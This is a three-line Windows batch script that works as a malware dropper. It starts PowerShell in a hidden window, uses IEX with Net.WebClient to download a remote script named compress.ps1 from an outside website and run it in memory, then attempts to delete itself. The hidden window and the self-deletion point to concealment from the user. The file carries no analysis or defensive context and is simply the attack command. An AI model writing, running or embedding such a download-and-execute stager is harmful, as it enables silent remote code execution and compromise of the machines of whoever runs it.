@echo off
powershell -windowstyle hidden -NoExit "IEX(New-Object Net.WebClient).downloadString('https://centrostudidanza21.it/compress.ps1')"
delete compress.bat